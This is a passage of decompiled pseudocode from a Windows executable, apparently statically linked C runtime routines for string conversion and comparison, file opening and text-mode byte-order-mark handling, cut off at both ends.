  if ( this != nullptr )
  {
    v11 = this;
    v12 = v7;
    while ( 1 )
    {
      v13 = (__crt_mbstring *)v19;
      if ( a3 >= 4 )
        v13 = v11;
      v14 = __crt_mbstring::__c16rtomb_utf8(v13, (char *)*v7, v6, v5);
      v15 = v14;
      if ( v14 == -1 )
        break;
      if ( v13 != v11 )
      {
        if ( a3 < v14 )
          goto LABEL_15;
        memcpy(v11, v13, v14);
      }
      if ( v15 != 0 )
      {
        if ( *((_BYTE *)v11 + v15 - 1) == 0 )
        {
          v12 = nullptr;
          v11 = (__crt_mbstring *)((char *)v11 + v15 - 1);
LABEL_15:
          *a2 = v12;
          return v11 - this;
        }
        v12 = ++v7;
      }
      else
      {
        ++v7;
      }
      v5 = a5;
      a3 -= v15;
      v11 = (__crt_mbstring *)((char *)v11 + v15);
      v6 = v18;
    }
    *a2 = v12;
    return -1;
  }
  else
  {
    v17 = 0;
    result = __crt_mbstring::__c16rtomb_utf8((__crt_mbstring *)v19, (char *)*v7, a4, a5);
    if ( result != -1 )
    {
      while ( result == 0 || v19[result - 1] != 0 )
      {
        ++v7;
        v17 += result;
        result = __crt_mbstring::__c16rtomb_utf8((__crt_mbstring *)v19, (char *)*v7, v6, a5);
        if ( result == -1 )
          return result;
      }
      return v17 + result - 1;
    }
  }
  return result;
}


// ----- sub_140027F20 @ 0x140027f20 -----
__int64 __fastcall sub_140027F20(_BYTE *a1, __int64 a2, __int64 a3, __int64 a4)
{
  __int64 v5; // rbx
  _BYTE *v6; // r11
  __int64 v8; // r10
  __int64 v9; // r8
  char v10; // al
  char v11; // al
  __int64 v12; // r9
  __int64 v13; // rax

  v5 = a2;
  v6 = a1;
  if ( a4 != 0 )
  {
    if ( a1 == nullptr )
      goto LABEL_11;
  }
  else if ( a1 == nullptr )
  {
    if ( a2 == 0 )
      return 0;
    goto LABEL_11;
  }
  if ( a2 != 0 )
  {
    if ( a4 == 0 )
    {
      *a1 = 0;
      return 0;
    }
    if ( a3 != 0 )
    {
      v8 = a3 - (_QWORD)a1;
      v9 = a4;
      if ( a4 == -1 )
      {
        while ( 1 )
        {
          v10 = a1[v8];
          *a1++ = v10;
          if ( v10 == 0 )
            break;
          if ( --a2 == 0 )
            goto LABEL_23;
        }
      }
      else
      {
        while ( 1 )
        {
          v11 = a1[v8];
          v12 = v9;
          *a1++ = v11;
          if ( v11 == 0 )
            break;
          if ( --a2 != 0 && --v9 != 0 )
            continue;
          v13 = v12 - 1;
          if ( a2 == 0 )
            v13 = v12;
          if ( v13 == 0 )
            *a1 = 0;
LABEL_23:
          if ( a2 == 0 )
          {
            if ( a4 == -1 )
            {
              v6[v5 - 1] = 0;
              return 80;
            }
            else
            {
              *v6 = 0;
              *(_DWORD *)sub_140018888() = 34;
              invalid_parameter_noinfo();
              return 34;
            }
          }
          return 0;
        }
      }
      return 0;
    }
    *a1 = 0;
  }
LABEL_11:
  *(_DWORD *)sub_140018888() = 22;
  invalid_parameter_noinfo();
  return 22;
}


// ----- sub_140028050 @ 0x140028050 -----
__int64 __fastcall sub_140028050(unsigned __int16 *a1, unsigned __int16 *a2, __int64 a3)
{
  __int64 v3; // r9
  __int64 result; // rax
  int v7; // ecx
  int v8; // r8d
  int v9; // edx
  int v10; // edx

  v3 = a3;
  if ( a3 == 0 )
    return 0;
  do
  {
    v7 = *a1++;
    v8 = *a2++;
    if ( v7 != v8 )
    {
      v9 = v7 + 32;
      if ( (unsigned int)(v7 - 65) > 0x19 )
        v9 = v7;
      v7 = v9;
      v10 = v8 + 32;
      if ( (unsigned int)(v8 - 65) > 0x19 )
        v10 = v8;
      v8 = v10;
    }
    result = (unsigned int)(v7 - v8);
    if ( v7 != v8 )
      break;
    if ( v7 == 0 )
      break;
    --v3;
  }
  while ( v3 != 0 );
  return result;
}


// ----- sub_1400280C0 @ 0x1400280c0 -----
__int64 __fastcall sub_1400280C0(__int64 a1, __int64 a2, __int64 a3)
{
  if ( dword_1400A0560 != 0 )
    return sub_1400280F0(a1, a2, a3, 0);
  if ( a1 != 0 && a2 != 0 )
    return sub_140028050((unsigned __int16 *)a1, (unsigned __int16 *)a2, a3);
  return sub_140022AC0(a1, a2);
}


// ----- sub_1400280F0 @ 0x1400280f0 -----
__int64 __fastcall sub_1400280F0(
        unsigned __int16 *a1,
        unsigned __int16 *a2,
        __int64 a3,
        struct __crt_locale_pointers *a4)
{
  __int64 v4; // rbp
  unsigned __int16 *v5; // r14
  unsigned __int16 *v6; // rbx
  int v8; // eax
  struct __crt_locale_data *locinfo; // rdx
  unsigned int v10; // edi
  unsigned __int16 v11; // cx
  unsigned __int16 v12; // ax
  unsigned __int16 v13; // cx
  int v14; // esi
  int v15; // edi
  unsigned __int16 v16; // ax
  __int64 v17; // [rsp+20h] [rbp-38h]
  struct __crt_locale_pointers v18; // [rsp+28h] [rbp-30h] BYREF
  char v19; // [rsp+38h] [rbp-20h]

  v4 = a3;
  v5 = a2;
  v6 = a1;
  if ( a1 != nullptr && a2 != nullptr )
  {
    if ( a3 != 0 )
    {
      v19 = 0;
      if ( a4 != nullptr )
      {
        v18 = *a4;
      }
      else if ( dword_1400A0560 != 0 )
      {
        v17 = sub_14001C7D8();
        v18.locinfo = *(struct __crt_locale_data **)(v17 + 144);
        v18.mbcinfo = *(struct __crt_multibyte_data **)(v17 + 136);
        sub_14001C98C(v17, (__int64 *)&v18);
        sub_14001C9F8(v17, (__int64 *)&v18.mbcinfo);
        v8 = *(_DWORD *)(v17 + 936);
        if ( (v8 & 2) == 0 )
        {
          *(_DWORD *)(v17 + 936) = v8 | 2;
          v19 = 1;
        }
      }
      else
      {
        v18 = *(struct __crt_locale_pointers *)&off_14009ECA8;
      }
      locinfo = v18.locinfo;
      if ( *((_QWORD *)v18.locinfo + 39) != 0 )
      {
        do
        {
          v11 = *v6++;
          if ( v11 >= 0x100u )
          {
            v12 = sub_140015A14(v11, &v18);
            locinfo = v18.locinfo;
          }
          else
          {
            if ( (*((_BYTE *)&unk_140091510 + 2 * (unsigned __int8)v11 + 2) & 1) != 0 )
              LOBYTE(v11) = *(_BYTE *)((unsigned __int8)v11 + *((_QWORD *)locinfo + 34));
            v12 = (unsigned __int8)v11;
          }
          v13 = *v5++;
          v14 = v12;
          v15 = v12;
          if ( v13 >= 0x100u )
          {
            v16 = sub_140015A14(v13, &v18);
            locinfo = v18.locinfo;
          }
          else
          {
            if ( (*((_BYTE *)&unk_140091510 + 2 * (unsigned __int8)v13 + 2) & 1) != 0 )
              LOBYTE(v13) = *(_BYTE *)((unsigned __int8)v13 + *((_QWORD *)locinfo + 34));
            v16 = (unsigned __int8)v13;
          }
          v10 = v15 - v16;
          if ( v10 != 0 )
            break;
          if ( v14 == 0 )
            break;
          --v4;
        }
        while ( v4 != 0 );
      }
      else
      {
        v10 = sub_140028050(v6, v5, v4);
      }
      if ( v19 != 0 )
        *(_DWORD *)(v17 + 936) &= ~2u;
      return v10;
    }
    else
    {
      return 0;
    }
  }
  else
  {
    *(_DWORD *)sub_140018888() = 22;
    invalid_parameter_noinfo();
    return 0x7FFFFFFF;
  }
}


// ----- sub_1400282D0 @ 0x1400282d0 -----
__int64 __fastcall sub_1400282D0(__int64 a1, __int64 a2, unsigned __int64 a3)
{
  if ( a1 == 0 || a2 == 0 || a3 > 0x7FFFFFFF )
  {
    *(_DWORD *)sub_140018888() = 22;
    invalid_parameter_noinfo();
  }
  return 0x7FFFFFFF;
}


// ----- sub_140028310 @ 0x140028310 -----
__int64 __fastcall sub_140028310(__int64 a1, __int64 a2, unsigned __int64 a3)
{
  unsigned __int64 v3; // r10
  unsigned __int8 *v4; // rbx
  unsigned __int8 *v5; // r11
  __int64 result; // rax
  int v7; // ecx
  int v8; // r8d
  int v9; // edx

  v3 = a3;
  v4 = (unsigned __int8 *)a2;
  v5 = (unsigned __int8 *)a1;
  if ( dword_1400A0560 != 0 )
    return sub_1400283A0(a1, a2, a3, 0);
  if ( a1 == 0 || a2 == 0 || a3 > 0x7FFFFFFF )
    return sub_1400282D0(a1, a2, a3);
  if ( a3 == 0 )
    return 0;
  do
  {
    v7 = *v5++;
    v8 = *v4++;
    if ( v7 != v8 )
    {
      v9 = v7 + 32;
      if ( (unsigned int)(v7 - 65) > 0x19 )
        v9 = v7;
      v7 = v9;
      if ( (unsigned int)(v8 - 65) <= 0x19 )
        v8 += 32;
    }
    result = (unsigned int)(v7 - v8);
    if ( v7 != v8 )
      break;
    if ( v7 == 0 )
      break;
    --v3;
  }
  while ( v3 != 0 );
  return result;
}


// ----- sub_1400283A0 @ 0x1400283a0 -----
__int64 __fastcall sub_1400283A0(unsigned __int8 *a1, __int64 a2, unsigned __int64 a3, __int128 *a4)
{
  unsigned __int64 v4; // rbx
  __int64 v5; // rdi
  unsigned __int8 *v6; // rsi
  __int64 result; // rax
  char v8; // r8
  int v9; // eax
  __int64 v10; // r9
  __int64 v11; // rax
  int v12; // edx
  __int64 v13; // [rsp+20h] [rbp-28h]
  __int128 v14; // [rsp+28h] [rbp-20h] BYREF
  char v15; // [rsp+38h] [rbp-10h]

  v4 = a3;
  v5 = a2;
  v6 = a1;
  if ( a1 != nullptr && a2 != 0 && a3 <= 0x7FFFFFFF )
  {
    if ( a3 != 0 )
    {
      v8 = 0;
      v15 = 0;
      if ( a4 != nullptr )
      {
        v14 = *a4;
      }
      else if ( dword_1400A0560 != 0 )
      {
        v13 = sub_14001C7D8();
        *(_QWORD *)&v14 = *(_QWORD *)(v13 + 144);
        *((_QWORD *)&v14 + 1) = *(_QWORD *)(v13 + 136);
        sub_14001C98C(v13, (__int64 *)&v14);
        sub_14001C9F8(v13, (__int64 *)&v14 + 1);
        v9 = *(_DWORD *)(v13 + 936);
        if ( (v9 & 2) != 0 )
        {
          v8 = v15;
        }
        else
        {
          v8 = 1;
          *(_DWORD *)(v13 + 936) = v9 | 2;
          v15 = 1;
        }
      }
      else
      {
        v14 = *(_OWORD *)&off_14009ECA8;
      }
      v10 = *(_QWORD *)(v14 + 272);
      do
      {
        v11 = *v6++;
        ++v5;
        v12 = *(unsigned __int8 *)(v11 + v10);
        result = v12 - (unsigned int)*(unsigned __int8 *)(*(unsigned __int8 *)(v5 - 1) + v10);
        if ( (_DWORD)result != 0 )
          break;
        if ( v12 == 0 )
          break;
        --v4;
      }
      while ( v4 != 0 );
      if ( v8 != 0 )
        *(_DWORD *)(v13 + 936) &= ~2u;
    }
    else
    {
      return 0;
    }
  }
  else
  {
    *(_DWORD *)sub_140018888() = 22;
    invalid_parameter_noinfo();
    return 0x7FFFFFFF;
  }
  return result;
}


// ----- sub_1400284FC @ 0x1400284fc -----
__int64 __fastcall sub_1400284FC(__int64 a1, unsigned int a2, int a3, int a4, int *a5, int a6)
{
  unsigned int v7; // edi
  __int64 v8; // rax
  int v9; // [rsp+40h] [rbp-18h] BYREF
  unsigned int v10; // [rsp+44h] [rbp-14h]

  if ( a5 == nullptr || (*a5 = -1, a1 == 0) || a6 != 0 && (a4 & 0xFFFFFE7F) != 0 )
  {
    *(_DWORD *)sub_140018888() = 22;
    invalid_parameter_noinfo();
    return 22;
  }
  else
  {
    v9 = 0;
    v10 = 0;
    v7 = sub_140028B18(&v9, a5, a1, a2, a3, a4, a6);
    v10 = v7;
    if ( v9 != 0 )
    {
      if ( v7 != 0 )
      {
        v8 = qword_1400A0680[(__int64)*a5 >> 6];
        *(_BYTE *)(v8 + 72LL * (*a5 & 0x3F) + 56) &= ~1u;
      }
      _acrt_lowio_unlock_fh(*a5);
    }
    if ( v7 != 0 )
      *a5 = -1;
    return v7;
  }
}


// ----- ?configure_text_mode@@YAHHUfile_options@?A0xa9d50aae@@HAEAW4__crt_lowio_text_mode@@@Z @ 0x1400285c0 -----
__int64 __fastcall configure_text_mode(int a1, __int64 a2, int a3, _BYTE *a4)
{
  int v5; // ebx
  int v7; // esi
  int v9; // ecx
  int v10; // edi
  unsigned int v11; // eax
  int v12; // ecx
  int v13; // ecx
  int v14; // eax
  int v16; // eax
  int v17; // eax
  int v18; // [rsp+50h] [rbp+8h] BYREF

  v5 = 0;
  *a4 = 0;
  v7 = a3;
  if ( *(char *)(qword_1400A0680[(__int64)a1 >> 6] + 72LL * (a1 & 0x3F) + 56) >= 0 )
    return 0;
  if ( (a3 & 0x74000) == 0 )
  {
    v18 = 0;
    if ( get_fmode(&v18) != 0 )
      invoke_watson(nullptr, nullptr, nullptr, 0, 0);
    if ( (v18 & 0x74000) != 0 )
      v7 |= v18 & 0x74000;
    else
      v7 |= 0x4000u;
  }
  v9 = v7 & 0x74000;
  v10 = 2;
  if ( (v7 & 0x74000) == 0x4000 )
  {
    *a4 = 0;
    goto LABEL_15;
  }
  if ( ((v9 - 0x10000) & 0xFFFFBFFF) == 0 )
  {
    if ( (v7 & 0x301) != 0x301 )
      goto LABEL_15;
LABEL_13:
    *a4 = 2;
    goto LABEL_15;
  }
  if ( ((v9 - 0x20000) & 0xFFFFBFFF) == 0 )
    goto LABEL_13;
  if ( ((v9 - 0x40000) & 0xFFFFBFFF) == 0 )
    *a4 = 1;
LABEL_15:
  if ( (v7 & 0x70000) == 0 || (*(_BYTE *)a2 & 0x40) != 0 )
    return 0;
  v11 = *(_DWORD *)(a2 + 4) & 0xC0000000;
  if ( v11 != 0x40000000 )
  {
    if ( v11 == 0x80000000 )
      goto LABEL_32;
    if ( v11 != -1073741824 )
      return 0;
  }
  if ( *(_DWORD *)(a2 + 8) != 1 && *(_DWORD *)(a2 + 8) != 2 )
  {
    if ( *(_DWORD *)(a2 + 8) != 3 && *(_DWORD *)(a2 + 8) != 4 )
    {
      if ( *(_DWORD *)(a2 + 8) != 5 )
        return 0;
      goto LABEL_25;
    }
    if ( lseeki64_nolock(a1, 0, 2u) != 0 )
    {
      if ( lseeki64_nolock(a1, 0, 0) == -1 )
        return *(unsigned int *)sub_140018888();
      if ( (*(_DWORD *)(a2 + 4) & 0x80000000) == 0 )
        return 0;
LABEL_32:
      v18 = 0;
      v16 = sub_14001FF14(a1, (__int16 *)&v18, 3u);
      if ( v16 == -1 )
        return *(unsigned int *)sub_140018888();
      if ( v16 != 2 )
      {
        if ( v16 != 3 )
          goto LABEL_42;
        if ( v18 == 12565487 )
        {
          *a4 = 1;
          return 0;
        }
      }
      if ( (unsigned __int16)v18 == 65534 )
      {
        *(_DWORD *)sub_140018888() = 22;
        return *(unsigned int *)sub_140018888();
      }
      if ( (unsigned __int16)v18 == 65279 )
      {
        if ( lseeki64_nolock(a1, (LARGE_INTEGER)2LL, 0) != -1 )
        {
          *a4 = 2;
          return 0;
        }
        return *(unsigned int *)sub_140018888();
      }
LABEL_42:
      if ( lseeki64_nolock(a1, 0, 0) != -1 )
        return 0;
      return *(unsigned int *)sub_140018888();
    }
  }
LABEL_25:
  v12 = (char)*a4;
  v18 = 0;
  v13 = v12 - 1;
  if ( v13 == 0 )
  {
    v10 = 3;
    v14 = 12565487;
LABEL_45:
    v18 = v14;
    while ( 1 )
    {
      v17 = write(a1, (char *)&v18 + v5, v10 - v5);
      if ( v17 == -1 )
        break;
      v5 += v17;
      if ( v10 <= v5 )
        return 0;
    }
    return *(unsigned int *)sub_140018888();
  }
  if ( v13 == 1 )
  {
    v14 = 65279;
    goto LABEL_45;
  }
  return 0;
}


// ----- sub_140028840 @ 0x140028840 -----
__int64 __fastcall sub_140028840(__int64 a1, int a2, int a3, char a4)
{
  int v8; // esi
  int v9; // eax
  int v10; // eax
  int v11; // eax
  int v12; // ebp
  int v13; // ebp
  int v14; // ebp
  int v15; // ebp
  int PMode; // [rsp+58h] [rbp+10h] BYREF

  *(_OWORD *)a1 = 0;
  *(_QWORD *)(a1 + 16) = 0;
  v8 = -1;
  if ( (a2 & 3) != 0 )
  {
    if ( (a2 & 3) == 1 )
    {
      v9 = (a2 & 8) != 0 && (a2 & 0x70000) != 0 ? -1073741824 : 0x40000000;
    }
    else if ( (a2 & 3) == 2 )
    {
      v9 = -1073741824;
    }
    else
    {
      *(_DWORD *)sub_140018888() = 22;
      invalid_parameter_noinfo();
      v9 = -1;
    }
  }
  else
  {
    v9 = 0x80000000;
  }
  *(_DWORD *)(a1 + 4) = v9;
  v10 = a2 & 0x700;
  if ( (a2 & 0x700) != 0 )
  {
    switch ( v10 )
    {
      case 256:
        v11 = 4;
        goto LABEL_22;
      case 512:
LABEL_19:
        v11 = 5;
        goto LABEL_22;
      case 768:
        v11 = 2;
        goto LABEL_22;
      default:
        break;
    }
    if ( v10 != 1024 )
    {
      if ( v10 == 1280 )
      {
LABEL_17:
        v11 = 1;
        goto LABEL_22;
      }
      if ( v10 != 1536 )
      {
        if ( v10 != 1792 )
        {
          *(_DWORD *)sub_140018888() = 22;
          invalid_parameter_noinfo();
          v11 = -1;
          goto LABEL_22;
        }
        goto LABEL_17;
      }
      goto LABEL_19;
    }
  }
  v11 = 3;
LABEL_22:
  *(_DWORD *)(a1 + 8) = v11;
  v12 = a3 - 16;
  if ( v12 != 0 )
  {
    v13 = v12 - 16;
    if ( v13 != 0 )
    {
      v14 = v13 - 16;
      if ( v14 != 0 )
      {
        v15 = v14 - 16;
        if ( v15 != 0 )
        {
          if ( v15 == 64 )
          {
            v8 = *(_DWORD *)(a1 + 4) == 0x80000000;
          }
          else
          {
            *(_DWORD *)sub_140018888() = 22;
            invalid_parameter_noinfo();
          }
        }
        else
        {
          v8 = 3;
        }
      }
      else
      {
        v8 = 2;
      }
    }
    else
    {
      v8 = 1;
    }
  }
  else
  {
    v8 = 0;
  }
  *(_DWORD *)(a1 + 20) = 0;
  *(_DWORD *)(a1 + 12) = v8;
  *(_DWORD *)(a1 + 16) = 128;
  if ( (a2 & 0x80u) != 0 )
    *(_BYTE *)a1 |= 0x10u;
  if ( (a2 & 0x8000) == 0 )
  {
    if ( (a2 & 0x74000) != 0 )
      goto LABEL_39;
    PMode = 0;
    if ( get_fmode(&PMode) != 0 )
      invoke_watson(nullptr, nullptr, nullptr, 0, 0);
    if ( PMode != 0x8000 )
LABEL_39:
      *(_BYTE *)a1 |= 0x80u;
  }
  if ( (a2 & 0x100) != 0 && (a4 & ~(_BYTE)dword_1400A0BE0 & 0x80u) == 0 )
    *(_DWORD *)(a1 + 16) = 1;
  if ( (a2 & 0x40) != 0 )
  {
    *(_DWORD *)(a1 + 20) |= 0x4000000u;
    *(_DWORD *)(a1 + 4) |= 0x10000u;
    *(_DWORD *)(a1 + 12) |= 4u;
  }
  if ( (a2 & 0x1000) != 0 )
    *(_DWORD *)(a1 + 16) |= 0x100u;
  if ( (a2 & 0x2000) != 0 )
    *(_DWORD *)(a1 + 20) |= 0x2000000u;
  if ( (a2 & 0x20) != 0 )
  {
    *(_DWORD *)(a1 + 20) |= 0x8000000u;
  }
  else if ( (a2 & 0x10) != 0 )
  {
    *(_DWORD *)(a1 + 20) |= 0x10000000u;
  }
  return a1;
}


// ----- ?truncate_ctrl_z_if_present@@YAHH@Z @ 0x140028a54 -----
__int64 __fastcall truncate_ctrl_z_if_present(int a1)
{
  __int64 v1; // rbx
  char v2; // cl
  LARGE_INTEGER v3; // rdi
  __int16 v5; // [rsp+30h] [rbp+8h] BYREF

  v1 = a1;
  v2 = *(_BYTE *)(qword_1400A0680[v1 >> 6] + 72 * (v1 & 0x3F) + 56);
  if ( (v2 & 0x48) == 0 && v2 < 0 )
  {
    v3 = lseeki64_nolock(v1, (LARGE_INTEGER)-1LL, 2u);
    if ( v3.QuadPart == -1 )
    {
      if ( *(_DWORD *)sub_140018864() != 131 )
        return *(unsigned int *)sub_140018888();
    }
    else
    {
      v5 = 0;
      if ( (unsigned int)sub_14001FF14(v1, &v5, 1u) == 0
        && v5 == 26
        && (unsigned int)((__int64 (__fastcall *)(_QWORD, _QWORD))chsize_nolock)(
                           (unsigned int)v1,
                           (LARGE_INTEGER)v3.QuadPart) == -1
        || lseeki64_nolock(v1, 0, 0) == -1 )
      {
        return *(unsigned int *)sub_140018888();
      }
    }
  }
  return 0;
}


// ----- sub_140028B18 @ 0x140028b18 -----
__int64 __fastcall sub_140028B18(_DWORD *a1, int *a2, const WCHAR *a3, int a4, int a5, char a6)
{
  __int64 v10; // rax
  __int128 v11; // xmm0
  __int64 v12; // r14
  int v14; // eax
  __int128 dwCreationDisposition; // xmm0
  int v16; // r15^4
  __int64 dwFlagsAndAttributes; // r15
  HANDLE v18; // r13
  int v19; // ebx
  DWORD LastError; // eax
  DWORD FileType; // eax
  DWORD v22; // ebx
  char v23; // r14
  __int64 v24; // rax
  __int64 v25; // rcx
  unsigned int v26; // r14d
  __int64 v27; // rcx
  int v28; // ecx
  __int64 v29; // rax
  __int64 v30; // rax
  HANDLE v31; // rdx
  DWORD v32; // eax
  _BYTE v33[4]; // [rsp+48h] [rbp-81h] BYREF
  DWORD v34; // [rsp+4Ch] [rbp-7Dh]
  __int128 v35; // [rsp+50h] [rbp-79h]
  __int64 v36; // [rsp+60h] [rbp-69h]
  char v37; // [rsp+68h] [rbp-61h]
  struct _SECURITY_ATTRIBUTES SecurityAttributes; // [rsp+70h] [rbp-59h] BYREF
  __int64 v39; // [rsp+88h] [rbp-41h]
  DWORD v40[2]; // [rsp+90h] [rbp-39h]
  DWORD dwShareMode[4]; // [rsp+98h] [rbp-31h]
  __int128 v42; // [rsp+A8h] [rbp-21h] BYREF
  __int64 v43; // [rsp+B8h] [rbp-11h]
  _BYTE v44[32]; // [rsp+C8h] [rbp-1h] BYREF

  v10 = sub_140028840((__int64)v44, a4, a5, a6);
  v11 = *(_OWORD *)v10;
  v12 = HIDWORD(*(_QWORD *)(v10 + 8));
  v39 = *(_QWORD *)(v10 + 16);
  v36 = v39;
  *(_QWORD *)dwShareMode = v12;
  v42 = v11;
  v35 = v11;
  if ( (_DWORD)v12 == -1 )
  {
    *(_DWORD *)sub_140018864() = 0;
    *a2 = -1;
    return *(unsigned int *)sub_140018888();
  }
  v14 = alloc_osfhnd();
  *a2 = v14;
  if ( v14 == -1 )
  {
    *(_DWORD *)sub_140018864() = 0;
    *a2 = -1;
    *(_DWORD *)sub_140018888() = 24;
    return *(unsigned int *)sub_140018888();
  }
  dwCreationDisposition = v42;
  v16 = HIDWORD(v36);
  *a1 = 1;
  dwFlagsAndAttributes = (unsigned int)v36 | v16;
  SecurityAttributes.bInheritHandle = (a4 & 0x80) == 0;
  *(_QWORD *)&SecurityAttributes.nLength = 24;
  *(&SecurityAttributes.bInheritHandle + 1) = false;
  SecurityAttributes.lpSecurityDescriptor = nullptr;
  *(_QWORD *)v40 = dwFlagsAndAttributes;
  v34 = DWORD2(dwCreationDisposition);
  v18 = CreateFileW(
          a3,
          DWORD1(dwCreationDisposition),
          v12,
          &SecurityAttributes,
          DWORD2(dwCreationDisposition),
          dwFlagsAndAttributes,
          nullptr);
  if ( v18 == (HANDLE)-1LL )
  {
    if ( (DWORD1(v42) & 0xC0000000) != 0xC0000000
      || (a4 & 1) == 0
      || (v19 = DWORD1(v42) & 0x7FFFFFFF,
          DWORD1(v35) = DWORD1(v42) & 0x7FFFFFFF,
          (v18 = CreateFileW(a3, DWORD1(v42) & 0x7FFFFFFF, v12, &SecurityAttributes, v34, dwFlagsAndAttributes, nullptr)) == (HANDLE)-1LL) )
    {
      *(_BYTE *)(qword_1400A0680[(__int64)*a2 >> 6] + 72LL * (*a2 & 0x3F) + 56) &= ~1u;
      LastError = GetLastError();
      sub_140018818(LastError);
      return *(unsigned int *)sub_140018888();
    }
  }
  else
  {
    v19 = DWORD1(v35);
  }
  FileType = GetFileType(v18);
  if ( FileType == 0 )
  {
    v22 = GetLastError();
    sub_140018818(v22);
    *(_BYTE *)(qword_1400A0680[(__int64)*a2 >> 6] + 72LL * (*a2 & 0x3F) + 56) &= ~1u;
    CloseHandle(v18);
    if ( v22 == 0 )
      *(_DWORD *)sub_140018888() = 13;
    return *(unsigned int *)sub_140018888();
  }
  v23 = v35;
  if ( FileType == 2 )
  {
    v23 = v35 | 0x40;
  }
  else if ( FileType == 3 )
  {
    v23 = v35 | 8;
  }
  _acrt_lowio_set_os_handle(*a2, v18);
  v24 = (__int64)*a2 >> 6;
  v25 = *a2 & 0x3F;
  v37 = v23 | 1;
  LOBYTE(v35) = v23 | 1;
  *(_BYTE *)(qword_1400A0680[v24] + 72 * v25 + 56) = v23 | 1;
  *(_BYTE *)(qword_1400A0680[(__int64)*a2 >> 6] + 72LL * (*a2 & 0x3F) + 57) = 0;
  if ( (a4 & 2) != 0 )
  {
    v26 = truncate_ctrl_z_if_present(*a2);
    if ( v26 != 0 )
    {
      v27 = (unsigned int)*a2;
LABEL_22:
      close_nolock(v27);
      return v26;
    }
  }
  v28 = *a2;
  v42 = v35;
  v33[0] = 0;
  v43 = v39;
  v26 = configure_text_mode(v28, (__int64)&v42, a4, v33);
  v29 = *a2;
  if ( v26 != 0 )
  {
    v27 = (unsigned int)v29;
    goto LABEL_22;
  }
  *(_BYTE *)(qword_1400A0680[v29 >> 6] + 72 * (v29 & 0x3F) + 57) = v33[0];
  v30 = *a2;
  *(_BYTE *)(qword_1400A0680[v30 >> 6] + 72 * (v30 & 0x3F) + 61) ^= (*(_BYTE *)(qword_1400A0680[v30 >> 6]
                                                                              + 72 * (v30 & 0x3F)
                                                                              + 61)
                                                                   ^ BYTE2(a4))
                                                                  & 1;
  if ( (v37 & 0x48) == 0 && (a4 & 8) != 0 )
    *(_BYTE *)(qword_1400A0680[(__int64)*a2 >> 6] + 72LL * (*a2 & 0x3F) + 56) |= 0x20u;
  if ( (v19 & 0xC0000000) == 0xC0000000 && (a4 & 1) != 0 )
  {
    CloseHandle(v18);
    DWORD1(v35) = v19 & 0x7FFFFFFF;
    v31 = CreateFileW(a3, v19 & 0x7FFFFFFF, dwShareMode[0], &SecurityAttributes, v34, v40[0], nullptr);
    if ( v31 == (HANDLE)-1LL )
    {
      v32 = GetLastError();
      sub_140018818(v32);
      *(_BYTE *)(qword_1400A0680[(__int64)*a2 >> 6] + 72LL * (*a2 & 0x3F) + 56) &= ~1u;
      free_osfhnd(*a2);
      return *(unsigned int *)sub_140018888();
    }
    *(_QWORD *)(qword_1400A0680[(__int64)*a2 >> 6] + 72LL * (*a2 & 0x3F) + 40) = v31;
  }
  return 0;
}


// ----- sub_140028F2C @ 0x140028f2c -----
__int64 __fastcall sub_140028F2C(int *a1, __int64 a2, unsigned int a3, int a4, int a5)
{
  return sub_1400284FC(a2, a3, a4, a5, a1, 1);
}


// ----- GetStringTypeW @ 0x140028f60 -----
// attributes: thunk
BOOL __stdcall GetStringTypeW(DWORD dwInfoType, LPCWCH lpSrcStr, int cchSrc, LPWORD lpCharType)
{
  return __imp_GetStringTypeW(dwInfoType, lpSrcStr, cchSrc, lpCharType);
}


// ----- sub_140028F68 @ 0x140028f68 -----
unsigned __int64 __fastcall sub_140028F68(_BYTE *a1, unsigned int a2, __crt_mbstring *a3, struct _Mbstatet *a4)
{
  __int64 v6; // r9
  char v7; // cl
  __int64 i; // r11
  char v9; // al

  if ( a1 == nullptr )
    goto LABEL_2;
  if ( a2 == 0 )
  {
    *a1 = 0;
LABEL_2:
    *(_QWORD *)a3 = 0;
    return 1;
  }
  if ( (a2 & 0xFFFFFF80) == 0 )
  {
    *a1 = a2;
    return 1;
  }
  if ( (a2 & 0xFFFFF800) == 0 )
  {
    v6 = 1;
    v7 = -64;
    goto LABEL_16;
  }
  if ( (a2 & 0xFFFF0000) == 0 )
  {
    if ( a2 - 55296 > 0x7FF )
    {
      v6 = 2;
      v7 = -32;
      goto LABEL_16;
    }
    return __crt_mbstring::return_illegal_sequence(a3, a4, a3);
  }
  if ( (a2 & 0xFFE00000) != 0 || a2 > 0x10FFFF )
    return __crt_mbstring::return_illegal_sequence(a3, a4, a3);
  v6 = 3;
  v7 = -16;
LABEL_16:
  for ( i = v6; i != 0; --i )
  {
    v9 = a2;
    a2 >>= 6;
    a1[i] = v9 & 0x3F | 0x80;
  }
  *a1 = a2 | v7;
  return __crt_mbstring::reset_and_return((__crt_mbstring *)(v6 + 1), (unsigned __int64)a3, (struct _Mbstatet *)a3);
}


// ----- ?reset_and_return@__crt_mbstring@@YA_K_KPEAU_Mbstatet@@@Z @ 0x14002900c -----
__crt_mbstring *__fastcall __crt_mbstring::reset_and_return(__crt_mbstring *this, _QWORD *a2, struct _Mbstatet *a3)
{
  *a2 = 0;
  return this;
}


// ----- ?return_illegal_sequence@__crt_mbstring@@YA_KPEAU_Mbstatet@@AEAV__crt_cached_ptd_host@@@Z @ 0x140029014 -----
unsigned __int64 __fastcall __crt_mbstring::return_illegal_sequence(
        __crt_mbstring *this,
        struct _Mbstatet *a2,
        struct __crt_cached_ptd_host *a3)
{
  *(_QWORD *)this = 0;
  LOBYTE(a2[6]._Wchar) = 1;
  *(_DWORD *)&a2[5]._Byte = 42;
  return -1;
}


// ----- sub_140029030 @ 0x140029030 -----
void __fastcall sub_140029030(
        unsigned __int64 a1,
        unsigned __int64 a2,
        unsigned __int64 a3,
        __int64 (__fastcall *a4)(unsigned __int64, _BYTE *))
{
  unsigned __int64 v7; // r13
  _BYTE *v8; // r15
  __int64 v9; // rcx
  unsigned __int64 v10; // rbx
  _BYTE *v11; // rbx
  unsigned __int64 i; // rdi
  int v13; // eax
  _BYTE *v14; // rcx
  unsigned __int64 v15; // r8
  _BYTE *v16; // rdx
  __int64 v17; // rbx
  char v18; // cl
  unsigned __int64 v19; // rbx
  _BYTE *v20; // rdi
  _BYTE *v21; // r8
  unsigned __int64 v22; // r9
  char v23; // cl
  unsigned __int64 v24; // r8
  _BYTE *v25; // rdx
  unsigned __int64 v26; // r9
  char v27; // cl
  unsigned __int64 v28; // r8
  _BYTE *v29; // rdx
  __int64 v30; // r9
  char v31; // cl
  unsigned __int64 v32; // rbx
  _BYTE *v33; // rsi
